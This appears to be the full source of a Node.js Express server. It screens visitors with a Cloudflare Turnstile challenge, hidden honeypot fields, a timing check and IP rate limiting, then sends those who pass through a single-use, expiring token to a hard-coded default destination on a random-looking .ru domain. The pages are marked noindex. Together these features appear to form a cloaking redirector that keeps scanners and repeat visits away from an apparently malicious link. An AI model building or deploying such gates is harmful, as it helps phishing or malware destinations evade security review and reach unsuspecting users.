const express = require('express');
const crypto = require('crypto');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ---------- CONFIG (all via environment variables) ----------
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET_KEY;
const TURNSTILE_SITE_KEY = process.env.TURNSTILE_SITE_KEY;
const DESTINATION_URL = process.env.DESTINATION_URL || "https://b314042fdb38.bvcmnil.ru/81eytn62vwhz";
const TOKEN_TTL_MS = parseInt(process.env.TOKEN_TTL_MS || "600000", 10); // 10 min default
const MIN_FORM_TIME_MS = parseInt(process.env.MIN_FORM_TIME_MS || "1000", 10); // 1s min

// ---------- IN-MEMORY STORES ----------
// token -> { used: bool, expiresAt: number }
const tokens = new Map();
// ip -> { count, resetAt }
const rateLimits = new Map();

// Cleanup expired tokens every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of tokens.entries()) {
    if (data.expiresAt < now) tokens.delete(token);
  }
}, 5 * 60 * 1000);

// ---------- HELPERS ----------
function generateToken() {
  return crypto.randomBytes(16).toString('hex');
}

function getClientIp(req) {
  return req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
}

function isRateLimited(ip) {
  const now = Date.now();
  const entry = rateLimits.get(ip);

  if (!entry || entry.resetAt < now) {
    rateLimits.set(ip, { count: 1, resetAt: now + 60 * 1000 }); // 1 min window
    return false;
  }

  entry.count++;
  if (entry.count > 10) return true; // 10 requests/min max
  return false;
}

// ---------- PAGE TEMPLATE ----------
function renderPage({ title, heading, body, showTurnstile = false }) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>${title}</title>
  ${showTurnstile ? '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>' : ''}
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #1e3a5f 0%, #2d5a7b 50%, #1a2f4a 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      animation: fadeIn 0.4s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .icon {
      width: 56px;
      height: 56px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: #eef4ff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
    }
    h1 {
      font-size: 22px;
      color: #1a1a2e;
      margin-bottom: 8px;
      font-weight: 600;
    }
    p.subtitle {
      color: #6b7280;
      font-size: 14px;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .turnstile-wrap {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #2d5a7b;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 10px;
    }
    button:hover { background: #1e3a5f; }
    button:disabled {
      background: #cbd5e1;
      cursor: not-allowed;
    }
    .spinner {
      width: 36px;
      height: 36px;
      border: 4px solid #e5e7eb;
      border-top-color: #2d5a7b;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .error-icon { background: #fee2e2; }
    .success-icon { background: #d1fae5; }
    .footer-note {
      margin-top: 24px;
      font-size: 12px;
      color: #9ca3af;
    }
    /* Honeypot traps - visually hidden but present in DOM for bots */
    .hp-field {
      position: absolute !important;
      left: -9999px !important;
      top: -9999px !important;
      width: 1px;
      height: 1px;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <div class="card">
    ${body}
  </div>
</body>
</html>`;
}

// ---------- ROUTES ----------

// Step 1: Landing/verification page
app.get('/', (req, res) => {
  const ip = getClientIp(req);
  if (isRateLimited(ip)) {
    return res.status(429).send(renderPage({
      title: "Too Many Requests",
      body: `
        <div class="icon error-icon">⏱️</div>
        <h1>Slow down</h1>
        <p class="subtitle">Too many requests from your network. Please try again in a minute.</p>
      `
    }));
  }

  const formLoadTime = Date.now();

  res.send(renderPage({
    title: "Verify You're Human",
    showTurnstile: true,
    body: `
      <div class="icon">🔒</div>
      <h1>Quick Security Check</h1>
      <p class="subtitle">Please complete the check below to continue to your destination.</p>

      <form method="POST" action="/verify" id="verifyForm">
        <div class="turnstile-wrap">
          <div class="cf-turnstile" data-sitekey="${TURNSTILE_SITE_KEY}" data-callback="onTurnstileSuccess"></div>
        </div>

        <!-- Honeypot traps: bots often fill ALL fields including hidden ones -->
        <div class="hp-field" aria-hidden="true">
          <input type="text" name="full_name" tabindex="-1" autocomplete="off">
          <input type="email" name="email_confirm" tabindex="-1" autocomplete="off">
          <input type="text" name="company_website" tabindex="-1" autocomplete="off">
        </div>

        <input type="hidden" name="form_loaded" value="${formLoadTime}">

        <button type="submit" id="submitBtn" disabled>Verifying...</button>
      </form>

      <p class="footer-note">This step helps protect against automated abuse.</p>

      <script>
        function onTurnstileSuccess() {
          document.getElementById('submitBtn').disabled = false;
          document.getElementById('submitBtn').textContent = 'Continue';
        }
      </script>
    `
  }));
});

// Step 2: Verify submission, issue single-use token
app.post('/verify', async (req, res) => {
  const ip = getClientIp(req);

  if (isRateLimited(ip)) {
    return res.status(429).send(renderPage({
      title: "Too Many Requests",
      body: `<div class="icon error-icon">⏱️</div><h1>Slow down</h1><p class="subtitle">Please try again shortly.</p>`
    }));
  }

  const {
    'cf-turnstile-response': turnstileToken,
    full_name,
    email_confirm,
    company_website,
    form_loaded
  } = req.body;

  // --- Honeypot check: ANY hidden field filled = bot ---
  if (full_name || email_confirm || company_website) {
    return res.status(403).send(renderPage({
      title: "Access Denied",
      body: `<div class="icon error-icon">🚫</div><h1>Verification Failed</h1><p class="subtitle">Please try again from a standard browser.</p>`
    }));
  }

  // --- Timing check ---
  const elapsed = Date.now() - parseInt(form_loaded || "0", 10);
  if (!form_loaded || elapsed < MIN_FORM_TIME_MS) {
    return res.status(403).send(renderPage({
      title: "Access Denied",
      body: `<div class="icon error-icon">🚫</div><h1>Verification Failed</h1><p class="subtitle">Please try again.</p>`
    }));
  }

  // --- Turnstile token presence check ---
  if (!turnstileToken) {
    return res.status(403).send(renderPage({
      title: "Access Denied",
      body: `<div class="icon error-icon">🚫</div><h1>Verification Required</h1><p class="subtitle">Please complete the security check.</p>`
    }));
  }

  // --- Verify with Cloudflare ---
  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: TURNSTILE_SECRET,
        response: turnstileToken,
        remoteip: ip
      })
    });

    const verifyData = await verifyRes.json();

    if (!verifyData.success) {
      return res.status(403).send(renderPage({
        title: "Verification Failed",
        body: `<div class="icon error-icon">🚫</div><h1>Verification Failed</h1><p class="subtitle">Please try again.</p>`
      }));
    }

    // --- Generate single-use token ---
    const token = generateToken();
    tokens.set(token, {
      used: false,
      expiresAt: Date.now() + TOKEN_TTL_MS
    });

    // Show a brief "redirecting" page that calls /r/:token
    res.send(renderPage({
      title: "Verified",
      body: `
        <div class="spinner"></div>
        <h1>Verified!</h1>
        <p class="subtitle">Redirecting you now...</p>
        <script>
          setTimeout(() => { window.location.href = "/r/${token}"; }, 800);
        </script>
      `
    }));

  } catch (err) {
    return res.status(500).send(renderPage({
      title: "Error",
      body: `<div class="icon error-icon">⚠️</div><h1>Something Went Wrong</h1><p class="subtitle">Please try again later.</p>`
    }));
  }
});

// Step 3: Single-use redirect endpoint
app.get('/r/:token', (req, res) => {
  const { token } = req.params;
  const entry = tokens.get(token);

  if (!entry) {
    return res.status(404).send(renderPage({
      title: "Link Invalid",
      body: `
        <div class="icon error-icon">❌</div>
        <h1>Link Already Used or Expired</h1>
        <p class="subtitle">This link is no longer valid. Please request a new one.</p>
      `
    }));
  }

  if (entry.used) {
    return res.status(410).send(renderPage({
      title: "Link Already Used",
      body: `
        <div class="icon error-icon">🔁</div>
        <h1>Already Used</h1>
        <p class="subtitle">This link has already been used and cannot be reused.</p>
      `
    }));
  }

  if (entry.expiresAt < Date.now()) {
    tokens.delete(token);
    return res.status(410).send(renderPage({
      title: "Link Expired",
      body: `
        <div class="icon error-icon">⏰</div>
        <h1>Link Expired</h1>
        <p class="subtitle">This link has expired. Please request a new one.</p>
      `
    }));
  }

  // Mark as used immediately (before redirect)
  entry.used = true;

  return res.redirect(302, DESTINATION_URL);
});

// Health check (useful for Render)
app.get('/healthz', (req, res) => res.send('ok'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
